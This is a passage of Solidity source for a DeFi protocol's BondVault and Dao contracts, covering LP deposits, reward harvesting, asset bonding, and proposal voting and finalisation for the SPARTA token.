count of all existing & past BondVault members\n    function memberCount() external view returns (uint256 count){\n        return arrayMembers.length;\n    }\n\n    // Get array of all existing & past BondVault members\n    function allMembers() external view returns (address[] memory _allMembers){\n        return arrayMembers;\n    }\n\n    function release() external onlyDAO {\n        bondRelease = true;\n    }\n\n    // Get a bond details (scope: user -> asset)\n    function getMemberDetails(address member, address asset) external view returns (MemberDetails memory memberDetails){\n        memberDetails.isMember = mapBondAsset_memberDetails[asset].isMember[member];\n        memberDetails.bondedLP = mapBondAsset_memberDetails[asset].bondedLP[member];\n        memberDetails.claimRate = mapBondAsset_memberDetails[asset].claimRate[member];\n        memberDetails.lastBlockTime = mapBondAsset_memberDetails[asset].lastBlockTime[member];\n        return memberDetails;\n    }\n\n    // Get a users's totalWeight (scope: user)\n    function getMemberWeight(address member) external view returns (uint256) {\n        if (mapMember_weight[member] > 0) {\n            return mapMember_weight[member];\n        } else {\n            return 0;\n        }\n    } \n}\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n 